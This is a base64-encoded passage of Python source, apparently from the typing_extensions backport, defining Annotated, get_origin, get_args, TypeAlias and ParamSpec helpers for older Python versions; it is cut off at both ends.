YW1wbGU6IEFubm90YXRlZFtpbnQsIHJ1bnRpbWVfY2hlY2suVW5zaWduZWRdIGluZGljYXRlcyB0byB0aGVcbiAgICAgICAgaHlwb3RoZXRpY2FsIHJ1bnRpbWVfY2hlY2sgbW9kdWxlIHRoYXQgdGhpcyB0eXBlIGlzIGFuIHVuc2lnbmVkIGludC5cbiAgICAgICAgRXZlcnkgb3RoZXIgY29uc3VtZXIgb2YgdGhpcyB0eXBlIGNhbiBpZ25vcmUgdGhpcyBtZXRhZGF0YSBhbmQgdHJlYXRcbiAgICAgICAgdGhpcyB0eXBlIGFzIGludC5cblxuICAgICAgICBUaGUgZmlyc3QgYXJndW1lbnQgdG8gQW5ub3RhdGVkIG11c3QgYmUgYSB2YWxpZCB0eXBlIChhbmQgd2lsbCBiZSBpblxuICAgICAgICB0aGUgX19vcmlnaW5fXyBmaWVsZCksIHRoZSByZW1haW5pbmcgYXJndW1lbnRzIGFyZSBrZXB0IGFzIGEgdHVwbGUgaW5cbiAgICAgICAgdGhlIF9fZXh0cmFfXyBmaWVsZC5cblxuICAgICAgICBEZXRhaWxzOlxuXG4gICAgICAgIC0gSXRcJ3MgYW4gZXJyb3IgdG8gY2FsbCBgQW5ub3RhdGVkYCB3aXRoIGxlc3MgdGhhbiB0d28gYXJndW1lbnRzLlxuICAgICAgICAtIE5lc3RlZCBBbm5vdGF0ZWQgYXJlIGZsYXR0ZW5lZDo6XG5cbiAgICAgICAgICAgIEFubm90YXRlZFtBbm5vdGF0ZWRbVCwgQW5uMSwgQW5uMl0sIEFubjNdID09IEFubm90YXRlZFtULCBBbm4xLCBBbm4yLCBBbm4zXVxuXG4gICAgICAgIC0gSW5zdGFudGlhdGluZyBhbiBhbm5vdGF0ZWQgdHlwZSBpcyBlcXVpdmFsZW50IHRvIGluc3RhbnRpYXRpbmcgdGhlXG4gICAgICAgIHVuZGVybHlpbmcgdHlwZTo6XG5cbiAgICAgICAgICAgIEFubm90YXRlZFtDLCBBbm4xXSg1KSA9PSBDKDUpXG5cbiAgICAgICAgLSBBbm5vdGF0ZWQgY2FuIGJlIHVzZWQgYXMgYSBnZW5lcmljIHR5cGUgYWxpYXM6OlxuXG4gICAgICAgICAgICBPcHRpbWl6ZWQgPSBBbm5vdGF0ZWRbVCwgcnVudGltZS5PcHRpbWl6ZSgpXVxuICAgICAgICAgICAgT3B0aW1pemVkW2ludF0gPT0gQW5ub3RhdGVkW2ludCwgcnVudGltZS5PcHRpbWl6ZSgpXVxuXG4gICAgICAgICAgICBPcHRpbWl6ZWRMaXN0ID0gQW5ub3RhdGVkW0xpc3RbVF0sIHJ1bnRpbWUuT3B0aW1pemUoKV1cbiAgICAgICAgICAgIE9wdGltaXplZExpc3RbaW50XSA9PSBBbm5vdGF0ZWRbTGlzdFtpbnRdLCBydW50aW1lLk9wdGltaXplKCldXG4gICAgICAgICIiIlxuXG4gICAgICAgIF9fc2xvdHNfXyA9ICgpXG5cbiAgICAgICAgZGVmIF9fbmV3X18oY2xzLCAqYXJncywgKiprd2FyZ3MpOlxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJUeXBlIEFubm90YXRlZCBjYW5ub3QgYmUgaW5zdGFudGlhdGVkLiIpXG5cbiAgICAgICAgQHR5cGluZy5fdHBfY2FjaGVcbiAgICAgICAgZGVmIF9fY2xhc3NfZ2V0aXRlbV9fKGNscywgcGFyYW1zKTpcbiAgICAgICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHBhcmFtcywgdHVwbGUpIG9yIGxlbihwYXJhbXMpIDwgMjpcbiAgICAgICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkFubm90YXRlZFsuLi5dIHNob3VsZCBiZSB1c2VkICJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIndpdGggYXQgbGVhc3QgdHdvIGFyZ3VtZW50cyAoYSB0eXBlIGFuZCBhbiAiXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJhbm5vdGF0aW9uKS4iKVxuICAgICAgICAgICAgYWxsb3dlZF9zcGVjaWFsX2Zvcm1zID0gKENsYXNzVmFyLCBGaW5hbClcbiAgICAgICAgICAgIGlmIGdldF9vcmlnaW4ocGFyYW1zWzBdKSBpbiBhbGxvd2VkX3NwZWNpYWxfZm9ybXM6XG4gICAgICAgICAgICAgICAgb3JpZ2luID0gcGFyYW1zWzBdXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIG1zZyA9ICJBbm5vdGF0ZWRbdCwgLi4uXTogdCBtdXN0IGJlIGEgdHlwZS4iXG4gICAgICAgICAgICAgICAgb3JpZ2luID0gdHlwaW5nLl90eXBlX2NoZWNrKHBhcmFtc1swXSwgbXNnKVxuICAgICAgICAgICAgbWV0YWRhdGEgPSB0dXBsZShwYXJhbXNbMTpdKVxuICAgICAgICAgICAgcmV0dXJuIF9Bbm5vdGF0ZWRBbGlhcyhvcmlnaW4sIG1ldGFkYXRhKVxuXG4gICAgICAgIGRlZiBfX2luaXRfc3ViY2xhc3NfXyhjbHMsICphcmdzLCAqKmt3YXJncyk6XG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXG4gICAgICAgICAgICAgICAgZiJDYW5ub3Qgc3ViY2xhc3Mge2Nscy5fX21vZHVsZV9ffS5Bbm5vdGF0ZWQiXG4gICAgICAgICAgICApXG5cbiMgUHl0aG9uIDMuOCBoYXMgZ2V0X29yaWdpbigpIGFuZCBnZXRfYXJncygpIGJ1dCB0aG9zZSBpbXBsZW1lbnRhdGlvbnMgYXJlblwndFxuIyBBbm5vdGF0ZWQtYXdhcmUsIHNvIHdlIGNhblwndCB1c2UgdGhvc2UuIFB5dGhvbiAzLjlcJ3MgdmVyc2lvbnMgZG9uXCd0IHN1cHBvcnRcbiMgUGFyYW1TcGVjQXJncyBhbmQgUGFyYW1TcGVjS3dhcmdzLCBzbyBvbmx5IFB5dGhvbiAzLjEwXCdzIHZlcnNpb25zIHdpbGwgZG8uXG5pZiBzeXMudmVyc2lvbl9pbmZvWzoyXSA+PSAoMywgMTApOlxuICAgIGdldF9vcmlnaW4gPSB0eXBpbmcuZ2V0X29yaWdpblxuICAgIGdldF9hcmdzID0gdHlwaW5nLmdldF9hcmdzXG4jIDMuNy0zLjlcbmVsc2U6XG4gICAgdHJ5OlxuICAgICAgICAjIDMuOStcbiAgICAgICAgZnJvbSB0eXBpbmcgaW1wb3J0IF9CYXNlR2VuZXJpY0FsaWFzXG4gICAgZXhjZXB0IEltcG9ydEVycm9yOlxuICAgICAgICBfQmFzZUdlbmVyaWNBbGlhcyA9IHR5cGluZy5fR2VuZXJpY0FsaWFzXG4gICAgdHJ5OlxuICAgICAgICAjIDMuOStcbiAgICAgICAgZnJvbSB0eXBpbmcgaW1wb3J0IEdlbmVyaWNBbGlhcyBhcyBfdHlwaW5nX0dlbmVyaWNBbGlhc1xuICAgIGV4Y2VwdCBJbXBvcnRFcnJvcjpcbiAgICAgICAgX3R5cGluZ19HZW5lcmljQWxpYXMgPSB0eXBpbmcuX0dlbmVyaWNBbGlhc1xuXG4gICAgZGVmIGdldF9vcmlnaW4odHApOlxuICAgICAgICAiIiJHZXQgdGhlIHVuc3Vic2NyaXB0ZWQgdmVyc2lvbiBvZiBhIHR5cGUuXG5cbiAgICAgICAgVGhpcyBzdXBwb3J0cyBnZW5lcmljIHR5cGVzLCBDYWxsYWJsZSwgVHVwbGUsIFVuaW9uLCBMaXRlcmFsLCBGaW5hbCwgQ2xhc3NWYXJcbiAgICAgICAgYW5kIEFubm90YXRlZC4gUmV0dXJuIE5vbmUgZm9yIHVuc3VwcG9ydGVkIHR5cGVzLiBFeGFtcGxlczo6XG5cbiAgICAgICAgICAgIGdldF9vcmlnaW4oTGl0ZXJhbFs0Ml0pIGlzIExpdGVyYWxcbiAgICAgICAgICAgIGdldF9vcmlnaW4oaW50KSBpcyBOb25lXG4gICAgICAgICAgICBnZXRfb3JpZ2luKENsYXNzVmFyW2ludF0pIGlzIENsYXNzVmFyXG4gICAgICAgICAgICBnZXRfb3JpZ2luKEdlbmVyaWMpIGlzIEdlbmVyaWNcbiAgICAgICAgICAgIGdldF9vcmlnaW4oR2VuZXJpY1tUXSkgaXMgR2VuZXJpY1xuICAgICAgICAgICAgZ2V0X29yaWdpbihVbmlvbltULCBpbnRdKSBpcyBVbmlvblxuICAgICAgICAgICAgZ2V0X29yaWdpbihMaXN0W1R1cGxlW1QsIFRdXVtpbnRdKSA9PSBsaXN0XG4gICAgICAgICAgICBnZXRfb3JpZ2luKFAuYXJncykgaXMgUFxuICAgICAgICAiIiJcbiAgICAgICAgaWYgaXNpbnN0YW5jZSh0cCwgX0Fubm90YXRlZEFsaWFzKTpcbiAgICAgICAgICAgIHJldHVybiBBbm5vdGF0ZWRcbiAgICAgICAgaWYgaXNpbnN0YW5jZSh0cCwgKHR5cGluZy5fR2VuZXJpY0FsaWFzLCBfdHlwaW5nX0dlbmVyaWNBbGlhcywgX0Jhc2VHZW5lcmljQWxpYXMsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJhbVNwZWNBcmdzLCBQYXJhbVNwZWNLd2FyZ3MpKTpcbiAgICAgICAgICAgIHJldHVybiB0cC5fX29yaWdpbl9fXG4gICAgICAgIGlmIHRwIGlzIHR5cGluZy5HZW5lcmljOlxuICAgICAgICAgICAgcmV0dXJuIHR5cGluZy5HZW5lcmljXG4gICAgICAgIHJldHVybiBOb25lXG5cbiAgICBkZWYgZ2V0X2FyZ3ModHApOlxuICAgICAgICAiIiJHZXQgdHlwZSBhcmd1bWVudHMgd2l0aCBhbGwgc3Vic3RpdHV0aW9ucyBwZXJmb3JtZWQuXG5cbiAgICAgICAgRm9yIHVuaW9ucywgYmFzaWMgc2ltcGxpZmljYXRpb25zIHVzZWQgYnkgVW5pb24gY29uc3RydWN0b3IgYXJlIHBlcmZvcm1lZC5cbiAgICAgICAgRXhhbXBsZXM6OlxuICAgICAgICAgICAgZ2V0X2FyZ3MoRGljdFtzdHIsIGludF0pID09IChzdHIsIGludClcbiAgICAgICAgICAgIGdldF9hcmdzKGludCkgPT0gKClcbiAgICAgICAgICAgIGdldF9hcmdzKFVuaW9uW2ludCwgVW5pb25bVCwgaW50XSwgc3RyXVtpbnRdKSA9PSAoaW50LCBzdHIpXG4gICAgICAgICAgICBnZXRfYXJncyhVbmlvbltpbnQsIFR1cGxlW1QsIGludF1dW3N0cl0pID09IChpbnQsIFR1cGxlW3N0ciwgaW50XSlcbiAgICAgICAgICAgIGdldF9hcmdzKENhbGxhYmxlW1tdLCBUXVtpbnRdKSA9PSAoW10sIGludClcbiAgICAgICAgIiIiXG4gICAgICAgIGlmIGlzaW5zdGFuY2UodHAsIF9Bbm5vdGF0ZWRBbGlhcyk6XG4gICAgICAgICAgICByZXR1cm4gKHRwLl9fb3JpZ2luX18sKSArIHRwLl9fbWV0YWRhdGFfX1xuICAgICAgICBpZiBpc2luc3RhbmNlKHRwLCAodHlwaW5nLl9HZW5lcmljQWxpYXMsIF90eXBpbmdfR2VuZXJpY0FsaWFzKSk6XG4gICAgICAgICAgICBpZiBnZXRhdHRyKHRwLCAiX3NwZWNpYWwiLCBGYWxzZSk6XG4gICAgICAgICAgICAgICAgcmV0dXJuICgpXG4gICAgICAgICAgICByZXMgPSB0cC5fX2FyZ3NfX1xuICAgICAgICAgICAgaWYgZ2V0X29yaWdpbih0cCkgaXMgY29sbGVjdGlvbnMuYWJjLkNhbGxhYmxlIGFuZCByZXNbMF0gaXMgbm90IEVsbGlwc2lzOlxuICAgICAgICAgICAgICAgIHJlcyA9IChsaXN0KHJlc1s6LTFdKSwgcmVzWy0xXSlcbiAgICAgICAgICAgIHJldHVybiByZXNcbiAgICAgICAgcmV0dXJuICgpXG5cblxuIyAzLjEwK1xuaWYgaGFzYXR0cih0eXBpbmcsIFwnVHlwZUFsaWFzXCcpOlxuICAgIFR5cGVBbGlhcyA9IHR5cGluZy5UeXBlQWxpYXNcbiMgMy45XG5lbGlmIHN5cy52ZXJzaW9uX2luZm9bOjJdID49ICgzLCA5KTpcbiAgICBjbGFzcyBfVHlwZUFsaWFzRm9ybSh0eXBpbmcuX1NwZWNpYWxGb3JtLCBfcm9vdD1UcnVlKTpcbiAgICAgICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxuICAgICAgICAgICAgcmV0dXJuIFwndHlwaW5nX2V4dGVuc2lvbnMuXCcgKyBzZWxmLl9uYW1lXG5cbiAgICBAX1R5cGVBbGlhc0Zvcm1cbiAgICBkZWYgVHlwZUFsaWFzKHNlbGYsIHBhcmFtZXRlcnMpOlxuICAgICAgICAiIiJTcGVjaWFsIG1hcmtlciBpbmRpY2F0aW5nIHRoYXQgYW4gYXNzaWdubWVudCBzaG91bGRcbiAgICAgICAgYmUgcmVjb2duaXplZCBhcyBhIHByb3BlciB0eXBlIGFsaWFzIGRlZmluaXRpb24gYnkgdHlwZVxuICAgICAgICBjaGVja2Vycy5cblxuICAgICAgICBGb3IgZXhhbXBsZTo6XG5cbiAgICAgICAgICAgIFByZWRpY2F0ZTogVHlwZUFsaWFzID0gQ2FsbGFibGVbLi4uLCBib29sXVxuXG4gICAgICAgIEl0XCdzIGludmFsaWQgd2hlbiB1c2VkIGFueXdoZXJlIGV4Y2VwdCBhcyBpbiB0aGUgZXhhbXBsZSBhYm92ZS5cbiAgICAgICAgIiIiXG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcihmIntzZWxmfSBpcyBub3Qgc3Vic2NyaXB0YWJsZSIpXG4jIDMuNy0zLjhcbmVsc2U6XG4gICAgY2xhc3MgX1R5cGVBbGlhc0Zvcm0odHlwaW5nLl9TcGVjaWFsRm9ybSwgX3Jvb3Q9VHJ1ZSk6XG4gICAgICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcbiAgICAgICAgICAgIHJldHVybiBcJ3R5cGluZ19leHRlbnNpb25zLlwnICsgc2VsZi5fbmFtZVxuXG4gICAgVHlwZUFsaWFzID0gX1R5cGVBbGlhc0Zvcm0oXCdUeXBlQWxpYXNcJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2M9IiIiU3BlY2lhbCBtYXJrZXIgaW5kaWNhdGluZyB0aGF0IGFuIGFzc2lnbm1lbnQgc2hvdWxkXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYmUgcmVjb2duaXplZCBhcyBhIHByb3BlciB0eXBlIGFsaWFzIGRlZmluaXRpb24gYnkgdHlwZVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoZWNrZXJzLlxuXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRm9yIGV4YW1wbGU6OlxuXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByZWRpY2F0ZTogVHlwZUFsaWFzID0gQ2FsbGFibGVbLi4uLCBib29sXVxuXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSXRcJ3MgaW52YWxpZCB3aGVuIHVzZWQgYW55d2hlcmUgZXhjZXB0IGFzIGluIHRoZSBleGFtcGxlXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWJvdmUuIiIiKVxuXG5cbiMgUHl0aG9uIDMuMTArIGhhcyBQRVAgNjEyXG5pZiBoYXNhdHRyKHR5cGluZywgXCdQYXJhbVNwZWNBcmdzXCcpOlxuICAgIFBhcmFtU3BlY0FyZ3MgPSB0eXBpbmcuUGFyYW1TcGVjQXJnc1xuICAgIFBhcmFtU3BlY0t3YXJncyA9IHR5cGluZy5QYXJhbVNwZWNLd2FyZ3NcbiMgMy43LTMuOVxuZWxzZTpcbiAgICBjbGFzcyBfSW1tdXRhYmxlOlxuICAgICAgICAiIiJNaXhpbiB0byBpbmRpY2F0ZSB0aGF0IG9iamVjdCBzaG91bGQgbm90IGJlIGNvcGllZC4iIiJcbiAgICAgICAgX19zbG90c19fID0gKClcblxuICAgICAgICBkZWYgX19jb3B5X18oc2VsZik6XG4gICAgICAgICAgICByZXR1cm4gc2VsZlxuXG4gICAgICAgIGRlZiBfX2RlZXBjb3B5X18oc2VsZiwgbWVtbyk6XG4gICAgICAgICAgICByZXR1cm4gc2VsZlxuXG4gICAgY2xhc3MgUGFyYW1TcGVjQXJncyhfSW1tdXRhYmxlKTpcbiAgICAgICAgIiIiVGhlIGFyZ3MgZm9yIGEgUGFyYW1TcGVjIG9iamVjdC5cblxuICAgICAgICBHaXZlbiBhIFBhcmFtU3BlYyBvYmplY3QgUCwgUC5hcmdzIGlzIGFuIGluc3RhbmNlIG9mIFBhcmFtU3BlY0FyZ3MuXG5cbiAgICAgICAgUGFyYW1TcGVjQXJncyBvYmplY3RzIGhhdmUgYSByZWZlcmVuY2UgYmFjayB0byB0aGVpciBQYXJhbVNwZWM6XG5cbiAgICAgICAgUC5hcmdzLl9fb3JpZ2luX18gaXMgUFxuXG4gICAgICAgIFRoaXMgdHlwZSBpcyBtZWFudCBmb3IgcnVudGltZSBpbnRyb3NwZWN0aW9uIGFuZCBoYXMgbm8gc3BlY2lhbCBtZWFuaW5nIHRvXG4gICAgICAgIHN0YXRpYyB0eXBlIGNoZWNrZXJzLlxuICAgICAgICAiIiJcbiAgICAgICAgZGVmIF9faW5pdF9fKHNlbGYsIG9yaWdpbik6XG4gICAgICAgICAgICBzZWxmLl9fb3JpZ2luX18gPSBvcmlnaW5cblxuICAgICAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgICAgICByZXR1cm4gZiJ7c2VsZi5fX29yaWdpbl9fLl9fbmFtZV9ffS5hcmdzIlxuXG4gICAgICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXIpOlxuICAgICAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIFBhcmFtU3BlY0FyZ3MpOlxuICAgICAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX19vcmlnaW5fXyA9PSBvdGhlci5fX29yaWdpbl9fXG5cbiAgICBjbGFzcyBQYXJhbVNwZWNLd2FyZ3MoX0ltbXV0YWJsZSk6XG4gICAgICAgICIiIlRoZSBrd2FyZ3MgZm9yIGEgUGFyYW1TcGVjIG9iamVjdC5cblxuICAgICAgICBHaXZlbiBhIFBhcmFtU3BlYyBvYmplY3QgUCwgUC5rd2FyZ3MgaXMgYW4gaW5zdGFuY2Ugb2YgUGFyYW1TcGVjS3dhcmdzLlxuXG4gICAgICAgIFBhcmFtU3BlY0t3YXJncyBvYmplY3RzIGhhdmUgYSByZWZlcmVuY2UgYmFjayB0byB0aGVpciBQYXJhbVNwZWM6XG5cbiAgICAgICAgUC5rd2FyZ3MuX19vcmlnaW5fXyBpcyBQXG5cbiAgICAgICAgVGhpcyB0eXBlIGlzIG1lYW50IGZvciBydW50aW1lIGludHJvc3BlY3Rpb24gYW5kIGhhcyBubyBzcGVjaWFsIG1lYW5pbmcgdG9cbiAgICAgICAgc3RhdGljIHR5cGUgY2hlY2tlcnMuXG4gICAgICAgICIiIlxuICAgICAgICBkZWYgX19pbml0X18oc2VsZiwgb3JpZ2luKTpcbiAgICAgICAgICAgIHNlbGYuX19vcmlnaW5fXyA9IG9yaWdpblxuXG4gICAgICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcbiAgICAgICAgICAgIHJldHVybiBmIntzZWxmLl9fb3JpZ2luX18uX19uYW1lX199Lmt3YXJncyJcblxuICAgICAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyKTpcbiAgICAgICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBQYXJhbVNwZWNLd2FyZ3MpOlxuICAgICAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX19vcmlnaW5fXyA9PSBvdGhlci5fX29yaWdpbl9fXG5cbiMgMy4xMCtcbmlmIGhhc2F0dHIodHlwaW5nLCBcJ1BhcmFtU3BlY1wnKTpcbiAgICBQYXJhbVNwZWMgPSB0eXBpbmcuUGFyYW1TcGVjXG4jIDMuNy0zLjlcbmVsc2U6XG5cbiAgICAjIEluaGVyaXRzIGZyb20gbGlzdCBhcyBhIHdvcmthcm91bmQgZm9yIENhbGxhYmxlIGNoZWNrcyBpbiBQeXRob24gPCAzLjkuMi5cbiAgICBjbGFzcyBQYXJhbVNwZWMobGlzdCk6XG4gICAgICAgICIiIlBhcmFtZXRlciBzcGVjaWZpY2F0aW9uIHZhcmlhYmxlLlxuXG4gICAgICAgIFVzYWdlOjpcblxuICAgICAgICAgICBQID0gUGFyYW1TcGVjKFwnUFwnKVxuXG4gICAgICAgIFBhcmFtZXRlciBzcGVjaWZpY2F0aW9uIHZhcmlhYmxlcyBleGlzdCBwcmltYXJpbHkgZm9yIHRoZSBiZW5lZml0IG9mIHN0YXRpY1xuICAgICAgICB0eXBlIGNoZWNrZXJzLiAgVGhleSBhcmUgdXNlZCB0byBmb3J3YXJkIHRoZSBwYXJhbWV0ZXIgdHlwZXMgb2Ygb25lXG4gICAgICAgIGNhbGxhYmxlIHRvIGFub3RoZXIgY2FsbGFibGUsIGEgcGF0dGVybiBjb21tb25seSBmb3VuZCBpbiBoaWdoZXIgb3JkZXJcbiAgICAgICAgZnVuY3Rpb25zIGFuZCBkZWNvcmF0b3JzLiAgVGhleSBhcmUgb25seSB2YWxpZCB3aGVuIHVzZWQgaW4gYGBDb25jYXRlbmF0ZWBgLFxuICAgICAgICBvciBzIHRoZSBmaXJzdCBhcmd1bWVudCB0byBgYENhbGxhYmxlYGAuIEluIFB5dGhvbiAzLjEwIGFuZCBoaWdoZXIsXG4gICAgICAgIHRoZXkgYXJlIGFsc28gc3VwcG9ydGVkIGluIHVzZXItZGVmaW5lZCBHZW5lcmljcyBhdCBydW50aW1lLlxuICAgICAgICBTZWUgY2xhc3MgR2VuZXJpYyBmb3IgbW9yZSBpbmZvcm1hdGlvbiBvbiBnZW5lcmljIHR5cGVzLiAgQW5cbiAgICAgICAgZXhhbXBsZSBmb3IgYW5ub3RhdGluZyBhIGRlY29yYXRvcjo6XG5cbiAgICAgICAgICAgVCA9IFR5cGVWYXIoXCdUXCcpXG4gICAgICAgICAgIFAgPSBQYXJhbVNwZWMoXCdQXCcpXG5cbiAgICAgICAgICAgZGVmIGFkZF9sb2dnaW5nKGY6IENhbGxhYmxlW1AsIFRdKSAtPiBDYWxsYWJsZVtQLCBUXTpcbiAgICAgICAgICAgICAgIFwnXCdcJ0EgdHlwZS1zYWZlIGRlY29yYXRvciB0byBhZGQgbG9nZ2luZyB0byBhIGZ1bmN0aW9uLlwnXCdcJ1xuICAgICAgICAgICAgICAgZGVmIGlubmVyKCphcmdzOiBQLmFyZ3MsICoqa3dhcmdzOiBQLmt3YXJncykgLT4gVDpcbiAgICAgICAgICAgICAgICAgICBsb2dnaW5nLmluZm8oZlwne2YuX19uYW1lX199IHdhcyBjYWxsZWRcJylcbiAgICAgICAgICAgICAgICAgICByZXR1cm4gZigqYXJncywgKiprd2FyZ3MpXG4gICAgICAgICAgICAgICByZXR1cm4gaW5uZXJcblxuICAgICAgICAgICBAYWRkX2xvZ2dpbmdcbiAgICAgICAgICAgZGVmIGFkZF90d28oeDogZmxvYXQsIHk6IGZsb2F0KSAtPiBmbG9hdDpcbiAgICAgICAgICAgICAgIFwnXCdcJ0FkZCB0d28gbnVtYmVycyB0b2dldGhlci5cJ1wnXCdcbiAgICAgICAgICAgICAgIHJldHVybiB4ICsgeVxuXG4gICAgICAgIFBhcmFtZXRlciBzcGVjaWZpY2F0aW9uIHZhcmlhYmxlcyBkZWZpbmVkIHdpdGggY292YXJpYW50PVRydWUgb3JcbiAgICAgICAgY29udHJhdmFyaWFudD1UcnVlIGNhbiBiZSB1c2VkIHRvIGRlY2xhcmUgY292YXJpYW50IG9yIGNvbnRyYXZhcmlhbnRcbiAgICAgICAgZ2VuZXJpYyB0eXBlcy4gIFRoZXNlIGtleXdvcmQgYXJndW1lbnRzIGFyZSB2YWxpZCwgYnV0IHRoZWlyIGFjdHVhbCBzZW1hbnRpY3NcbiAgICAgICAgYXJlIHlldCB0byBiZSBkZWNpZGVkLiAgU2VlIFBFUCA2MTIgZm9yIGRldGFpbHMuXG5cbiAgICAgICAgUGFyYW1ldGVyIHNwZWNpZmljYXRpb24gdmFyaWFibGVzIGNhbiBiZSBpbnRyb3NwZWN0ZWQuIGUuZy46XG5cbiAgICAgICAgICAgUC5fX25hbWVfXyA9PSBcJ1RcJ1xuICAgICAgICAgICBQLl9fYm91bmRfXyA9PSBOb25lXG4gICAgICAgICAgIFAuX19jb3ZhcmlhbnRfXyA9PSBGYWxzZVxuICAgICAgICAgICBQLl9fY29udHJhdmFyaWFudF9fID09IEZhbHNlXG5cbiAgICAgICAgTm90ZSB0aGF0IG9ubHkgcGFyYW1ldGVyIHNwZWNpZmljYXRpb24gdmFyaWFibGVzIGRlZmluZWQgaW4gZ2xvYmFsIHNjb3BlIGNhblxuICAgICAgICBiZSBwaWNrbGVkLlxuICAgICAgICAiIiJcblxuICAgICAgICAjIFRyaWNrIEdlbmVyaWMgX19wYXJhbWV0ZXJzX18uXG4gICAgICAgIF9fY2xhc3NfXyA9IHR5cGluZy5UeXBlVmFyXG5cbiAgICAgICAgQHByb3BlcnR5XG4gICAgICAgIGRlZiBhcmdzKHNlbGYpOlxuICAgICAgICAgICAgcmV0dXJuIFBhcmFtU3BlY0FyZ3Moc2VsZilcblxuICAgICAgICBAcHJvcGVydHlcbiAgICAgICAgZGVmIGt3YXJncyhzZWxmKTpcbiAgICAgICAgICAgIHJldHVybiBQYXJhbVNwZWNLd2FyZ3Moc2VsZilcblxuICAgICAgICBkZWYgX19pbml0X18oc2VsZiwgbmFtZSwgKiwgYm91bmQ9Tm9uZSwgY292YXJpYW50PUZhbHNlLCBjb250cmF2YXJpYW50PUZhbHNlKTpcbiAgICAgICAgICAgIHN1cGVyKCkuX19pbml0X18oW3NlbGZdKVxuICAgICAgICAgICAgc2VsZi5fX25hbWVfXyA9IG5hbWVcbiAgICAgICAgICAgIHNlbGYuX19jb3ZhcmlhbnRfXyA9IGJvb2woY292YXJpYW50KVxuICAgICAgICAgICAgc2VsZi5fX2NvbnRyYXZhcmlhbnRfXyA9IGJvb2woY29udHJhdmFyaWFudClcbiAgICAgICAgICAgIGlmIGJvdW5kOlxuICAgICAgICAgICAgICAgIHNlbGYuX19ib3VuZF9fID0gdHlwaW5nLl90eXBlX2NoZWNrKGJvdW5kLCBcJ0JvdW5kIG11c3QgYmUgYSB0eXBlLlwnKVxuICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICBzZWxmLl9fYm91bmRfXyA9IE5vbmVcblxuICAgICAgICAgICAgIyBmb3IgcGlja2xpbmc6XG4gICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgZGVmX21vZCA9IHN5cy5fZ2V0ZnJhbWUoMSkuZl9nbG9iYWxzLmdldChcJ19fbmFtZV9fXCcsIFwnX19tYWluX19cJylcbiAgICAgICAgICAgIGV4Y2VwdCAoQXR0cmlidXRlRXJyb3IsIFZhbHVlRXJyb3IpOlxuICAgICAgICAgICAgICAgIGRlZl9tb2QgPSBOb25lXG4gICAgICAgICAgICBpZiBkZWZfbW9kICE9IFwndHlwaW5nX2V4dGVuc2lvbnNcJzpcbiAgICAgICAgICAgICAgICBzZWxmLl9fbW9kdWxlX18gPSBkZWZfbW9kXG5cbiAgICAgICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxuICAgICAgICAgICAgaWYgc2VsZi5fX2NvdmFyaWFudF9fOlxuICAgICAgICAgICAgICAgIHByZWZpeCA9IFwnK1wnXG4gICAgICAgICAgICBlbGlmIHNlbGYuX19jb250cmF2YXJpYW50X186XG4gICAgICAgICAgICAgICAgcHJlZml4ID0gXCctXCdcbiAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgcHJlZml4ID0gXCd+XCdcbiAgICAgICAgICAgIHJldHVybiBwcmVmaXggKyBzZWxmLl9fbmFtZV9fXG5cbiAgICAgICAgZGVmIF9faGFzaF9fKHNlbGYpOlxuICAgICAgICAgICAgcmV0dXJuIG9iamVjdC5fX2hhc2hfXyhzZWxmKVxuXG4gICAgICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXIpOlxuICAgICAgICAgICAgcmV0dXJuIHNlbGYgaXMgb3RoZXJcblxuICAgICAgICBkZWYgX19yZWR1Y2VfXyhzZWxmKTpcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9fbmFtZV9fXG5cbiAgICAgICAgIyBIYWNrIHRvIGdldCB0eXBpbmcuX3R5cGVfY2hlY2sgdG8gcGFzcy5cbiAgICAgICAgZGVmIF9fY2FsbF9fKHNlbGYsICphcmdzLCAqKmt3YXJncyk6XG4gICAgICAgICAgICBwYXNzXG5cblxuIyAzLjctMy45XG5pZiBub3QgaGFzYXR0cih0eXBpbmcsIFwnQ29uY2F0ZW5hdGVcJyk6XG4gICAgIyBJbmhlcml0cyBmcm9tIGxpc3QgYXMgYSB3b3JrYXJvdW5kIGZvciBDYWxsYWJsZSBjaGVja3MgaW4gUHl0aG9uIDwgMy45LjIuXG4gICAgY2xhc3MgX0NvbmNhdGVuYXRlR2VuZXJpY0FsaWFzKGxpc3QpOlxuXG4gICAgICAgICMgVHJpY2sgR2VuZXJpYyBpbnRvIGxvb2tpbmcgaW50byB0aGlzIGZvciBfX3BhcmFtZXRlcnNfXy5cbiAgICAgICAgX19jbGFzc19fID0gdHlwaW5nLl9HZW5lcmljQWxpYXNcblxuICAgICAgICAjIEZsYWcgaW4gM